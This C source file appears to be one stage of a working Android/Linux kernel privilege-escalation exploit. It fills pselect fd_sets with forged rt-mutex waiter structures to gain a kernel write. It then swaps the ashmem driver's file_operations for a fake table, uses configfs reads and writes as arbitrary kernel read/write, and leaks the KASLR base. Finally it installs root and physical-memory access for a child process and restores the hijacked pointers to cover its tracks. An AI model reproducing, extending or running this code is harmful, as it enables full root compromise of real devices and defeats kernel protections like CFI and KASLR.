#include "unplus.h"

#define PSELECT_CFI_ROUTE_ATTEMPTS 24

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
/* kaslr_base / kaslr_slide defined in route.c */
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_write, fd);
    }
  }
  close(high_write);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  fdset_put_word(in, 0, fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 3);
  fdset_put_word(ex, 3, 0);
}

/* --- Ghostlock PI custom write route (Write1 / stage1) --- */
#define PSELECT_ROUTE_ATTEMPTS 8

static int stage1_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int stage1_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) return 0;
  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0: fdset_put_word(in, word_idx, value); return 1;
    case 1: fdset_put_word(out, word_idx, value); return 1;
    case 2: fdset_put_word(ex, word_idx, value); return 1;
    default: return 0;
  }
}

static void stage1_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = PSELECT_WAITER_WORD_SHIFT + waiter_word;
  if (!stage1_pselect_put_global_word(in, out, ex, words_per_set, global_word, value))
    pr_error("pselect cannot place %s waiter_word=%d\n", name, waiter_word);
}

static void stage1_prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in); FD_ZERO(out); FD_ZERO(ex);
  uintptr_t target = pselect_write_target();
  uintptr_t value = pselect_write_value();
  uintptr_t parent = value, right = 0, left = target;
  int shape = pselect_write_shape();
  if (pselect_custom_write_enabled()) { parent = 0; right = 0; left = 0; }
  else if (shape == 1) { parent = (target < 8) ? 0 : target - 8; right = value; left = 0; }
  struct { int word; uint64_t value; const char *name; } words[] = {
    {0,parent,"tree_parent"},{1,right,"tree_right"},{2,left,"tree_left"},
    {3,FAKE_WAITER_PRIO,"tree_prio"},{4,0,"tree_deadline"},
    {5,parent,"pi_parent"},{6,right,"pi_right"},{7,left,"pi_left"},
    {8,FAKE_WAITER_PRIO,"pi_prio"},{9,0,"pi_deadline"},
    {10,pselect_custom_write_enabled()?fake_task:SLIDE_INIT_TASK,"task"},
    {11,fake_lock,"lock"},{12,3,"wake_state"},
  };
  int wps = stage1_pselect_words_per_set();
  for (size_t i = 0; i < sizeof(words)/sizeof(words[0]); i++)
    stage1_pselect_put_waiter_word(in,out,ex,wps,words[i].word,words[i].value,words[i].name);
}

static void stage1_open_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) { pr_error("pselect F_DUPFD read errno=%d\n", errno); }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++)
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex))
      SYSCHK(dup2(high_read, fd));
  close(high_read);
  SYSCHK(dup2(read_fd, PSELECT_ROUTE_NFDS - 1));
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

static void do_pselect_stage1_route(void) {
  if (!page_base || !fake_lock || !fake_task) {
    pr_error("pselect route missing page=%016zx lock=%016zx task=%016zx\n",
             page_base, fake_lock, fake_task);
  }
  for (int attempt = 1; attempt <= PSELECT_ROUTE_ATTEMPTS; attempt++) {
    if (attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_task)
        pr_error("pselect retry page prepare failed attempt=%d\n", attempt);
    }
    int pipefd[2]; SYSCHK(pipe(pipefd));
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) block_fd = pipefd[0];
    int high_read = SYSCHK(fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16));
    fd_set in, out, ex;
    stage1_prepare_pselect_fdsets(&in, &out, &ex);
    stage1_open_selected_fds(&in, &out, &ex, high_read);
    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&main_route_delay_usec, 0);
    atomic_store(&punch_consume_go, attempt);
    struct timespec timeout = { .tv_sec = PSELECT_TIMEOUT_SEC, .tv_nsec = 0 };
    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);
    int calls = atomic_load(&consumer_calls);
    int success = atomic_load(&consumer_success);
    pr_info("pselect attempt=%d ret=%d errno=%d calls=%d success=%d\n",
            attempt, ret, saved_errno, calls, success);
    close(high_read);
    if (block_fd != pipefd[0]) close(block_fd);
    close(pipefd[0]); close(pipefd[1]);
    if (calls > 0 && success > 0) return;
  }
  pr_error("pselect route exhausted\n");
}

/* --- CyberMeowfia configfs/ashmem route (stage2) --- */
static void do_pselect_cfi_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30; cfi_last_errno = 0;
    pr_error("pselect route missing kernel page\n");
    return;
  }
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS; route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) { cfi_last_step = 34; break; }
    }
    int pipefd[2]; SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) { cfi_last_step = 31; close(pipefd[0]); close(pipefd[1]); break; }
    fd_set in, out, ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
    atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&main_route_delay_usec, route_delay_usec(route_attempt));
    atomic_store(&punch_consume_go, route_attempt);
    struct timespec timeout = { .tv_sec = PSELECT_TIMEOUT_SEC, .tv_nsec = 0 };
    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);
    int calls = atomic_load(&consumer_calls), success = atomic_load(&consumer_success);
    pr_info("pselect cfi attempt=%d ret=%d errno=%d calls=%d success=%d\n",
            route_attempt, ret, saved_errno, calls, success);
    if (calls > 0 && success > 0) {
      if (try_cfi_stage()) { cfi_last_step = 0; route_verified = 1; }
      else if (!cfi_last_step) cfi_last_step = 32;
    } else if (!route_verified) { cfi_last_step = 33; cfi_last_errno = saved_errno; }
    close(high_read); close(pipefd[0]); close(pipefd[1]);

    if (route_verified || cfi_dirty_seen) break;
    pr_info("pselect cfi miss attempt=%d/%d\n", route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS);
  }
}

void do_pselect_fake_lock_route(void) {
  if (pselect_custom_write_enabled())
    do_pselect_stage1_route();
  else
    do_pselect_cfi_route();
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
